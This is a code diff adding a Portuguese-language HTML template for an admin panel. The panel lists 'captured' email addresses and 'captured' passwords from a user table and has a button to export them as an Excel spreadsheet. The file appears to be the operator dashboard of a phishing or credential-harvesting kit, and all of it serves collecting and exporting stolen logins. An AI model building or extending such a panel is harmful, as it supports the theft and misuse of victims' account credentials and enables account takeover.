@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Painel Admin</title>
+    <style>
+        table { width: 80%; margin: 20px auto; border-collapse: collapse; }
+        th, td { border: 1px solid #ddd; padding: 12px; text-align: left; }
+        th { background-color: #333; color: white; }
+        .btn-excel { display: block; width: 200px; margin: 20px auto; padding: 15px; background: green; color: white; text-align: center; text-decoration: none; border-radius: 5px; }
+    </style>
+</head>
+<body>
+    <h1 style="text-align: center;">Painel de Administração</h1>
+    
+    <a href="/exportar" class="btn-excel">Baixar Planilha Excel</a>
+
+    <table>
+        <tr>
+            <th>ID</th>
+            <th>Email Capturado</th>
+            <th>Senha Capturada</th>
+        </tr>
+        {% for u in usuarios %}
+        <tr>
+            <td>{{ u.id }}</td>
+            <td>{{ u.email }}</td>
+            <td>{{ u.senha }}</td>
+        </tr>
+        {% endfor %}
+    </table>
+</body>
+</html>
